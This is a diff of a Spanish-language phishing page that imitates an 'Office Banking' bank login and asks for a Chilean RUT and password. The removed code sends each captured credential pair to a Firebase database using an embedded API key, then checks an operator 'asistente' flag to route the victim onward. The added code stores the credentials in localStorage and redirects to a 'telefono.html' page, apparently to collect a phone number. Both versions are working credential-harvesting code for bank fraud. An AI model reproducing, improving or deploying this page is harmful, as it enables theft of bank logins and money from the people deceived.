@@ -1,157 +1,27 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Ingreso</title>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 2rem;
-      font-family: Arial, sans-serif;
-      background: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .container {
-      border: 2px solid red;
-      background: white;
-      padding: 2rem;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 400px;
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 1.5rem;
-    }
-    .title {
-      font-size: 22px;
-      margin-bottom: 2rem;
-    }
-    .title span:first-child {
-      color: black;
-    }
-    .title span:last-child {
-      background: red;
-      color: white;
-      padding: 0 6px;
-      border-radius: 4px;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 1rem;
-      border: 1px solid black;
-      border-radius: 5px;
-    }
-    .password-toggle {
-      position: relative;
-    }
-    .password-toggle input {
-      padding-right: 40px;
-    }
-    .toggle-icon {
-      position: absolute;
-      right: 10px;
-      top: 12px;
-      cursor: pointer;
-    }
-    button {
-      width: 100%;
-      background: red;
-      color: white;
-      padding: 10px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .message {
-      margin-top: 1rem;
-      text-align: center;
-      font-weight: bold;
-      color: red;
-    }
-  </style>
 </head>
 <body>
-  <div class="container">
-    <div class="title">
-      <span>Office</span><span>Banking</span>
-    </div>
-    <form id="loginForm">
-      <input type="text" id="rut" placeholder="RUT" required />
-      <div class="password-toggle">
-        <input type="password" id="clave" style="width: 240px;" placeholder="Contraseña" required />
-        <span class="toggle-icon" onclick="togglePassword()">👁️</span>
-      </div>
-      <button type="submit">Ingresar</button>
-    </form>
-    <div class="message" id="message"></div>
-  </div>
-
+  <form onsubmit="enviarFormulario(event)">
+    <label>RUT</label>
+    <input type="text" id="rut" required />
+    <label>Contraseña</label>
+    <input type="password" id="clave" required />
+    <button type="submit">Ingresar</button>
+  </form>
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
-      authDomain: "formulario-officebanking.firebaseapp.com",
-      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
-      projectId: "formulario-officebanking"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    function togglePassword() {
-      const input = document.getElementById("clave");
-      input.type = input.type === "password" ? "text" : "password";
-    }
-
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    function enviarFormulario(e) {
       e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const clave = document.getElementById("clave").value;
-
-      // Guardar en Firebase
-      const registro = {
-        rut: rut,
-        clave: clave,
-        timestamp: new Date().toISOString()
-      };
-      const newRef = db.ref("registros").push();
-      await newRef.set(registro);
-
-      // Consultar si modo asistente está activo
-      db.ref("asistente").once("value").then(snapshot => {
-        const asistenteActivo = snapshot.val();
-        if (asistenteActivo) {
-          window.location.href = 'cargando_rut.html';
-        } else {
-          document.getElementById("message").innerText = "Hemos recibido tu solicitud";
-        }
-      });
-    });
-  </script>
-
-  <script>
-    function formatearRut(rut) {
-      rut = rut.replace(/^0+|[^0-9kK]+/g, '').toUpperCase();
-      if (rut.length <= 1) return rut;
-      const cuerpo = rut.slice(0, -1).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-      const dv = rut.slice(-1);
-      return cuerpo + '-' + dv;
+      const rut = document.getElementById('rut').value;
+      const clave = document.getElementById('clave').value;
+      localStorage.setItem('rut', rut);
+      localStorage.setItem('clave', clave);
+      window.location.href = 'telefono.html';
     }
-
-    document.getElementById("rut").addEventListener("input", function(e) {
-      const pos = this.selectionStart;
-      this.value = formatearRut(this.value);
-      this.setSelectionRange(pos, pos);
-    });
   </script>
 </body>
-
 </html>
